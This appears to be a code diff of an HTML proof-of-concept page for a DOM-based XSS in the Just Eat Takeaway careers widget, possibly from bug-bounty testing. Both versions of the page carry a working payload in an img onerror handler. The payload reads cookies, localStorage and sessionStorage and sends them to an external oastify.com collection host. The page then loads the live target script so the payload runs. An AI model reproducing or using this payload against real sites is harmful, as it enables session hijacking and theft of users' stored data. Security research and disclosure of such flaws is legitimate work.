@@ -1,50 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>🔥 Just Eat Careers XSS Diagnostic</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔥 Just Eat Widget XSS PoC</title>
 </head>
 <body>
-<h2>🔥 DOM XSS Diagnostic - Just Eat Careers Widget</h2>
+<h2>DOM-Based XSS in Just Eat Careers Widget</h2>
 
-<!-- Exploit widget (triggers PhEnhancer parser) -->
-<div class="ph-widget" as-element="xssdiag">
-  <img src=x onerror="
-    (() => {
-      const id = Date.now() + '-' + Math.random().toString(36).slice(2);
-      const c = document.cookie;
-      const l = JSON.stringify(localStorage || {});
-      const s = JSON.stringify(sessionStorage || {});
-      const data = {
-        traceId: id,
-        timestamp: new Date().toISOString(),
-        url: location.href,
-        origin: location.origin,
-        referrer: document.referrer,
-        userAgent: navigator.userAgent,
-        cookie: c,
-        cookiePresent: c.length > 0,
-        cookieLength: c.length,
-        localStoragePresent: l.length > 2,
-        localStorageLength: l.length,
-        sessionStoragePresent: s.length > 2,
-        sessionStorageLength: s.length
-      };
-      fetch('https://kthsybv3oi9ybj96y9mkmo2qvh1bp4dt.oastify.com', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'text/plain' },
-        body: JSON.stringify(data)
-      });
-    })();
-  ">
+<!-- Malicious widget -->
+<div class="ph-widget" as-element="exploitWidget">
+<img src=x onerror="
+const exfil = {
+cookie: document.cookie,
+localStorage: JSON.stringify(localStorage),
+sessionStorage: JSON.stringify(sessionStorage),
+url: location.href,
+origin: location.origin,
+userAgent: navigator.userAgent,
+referrer: document.referrer
+};
+fetch('https://ykmkw5n8la7rld89saeryu121t7mvcj1.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body: JSON.stringify(exfil)
+});
+">
 </div>
 
-<!-- Load widget script -->
+<!-- Load vulnerable enhancer from target -->
 <script src="https://careers.justeattakeaway.com/global/en/phenomtrack.min.js"></script>
 <script>
-  if (window.PhEnhancer) PhEnhancer();
+window.PhEnhancer && PhEnhancer(); // Trigger widget parsing
 </script>
 </body>
 </html>
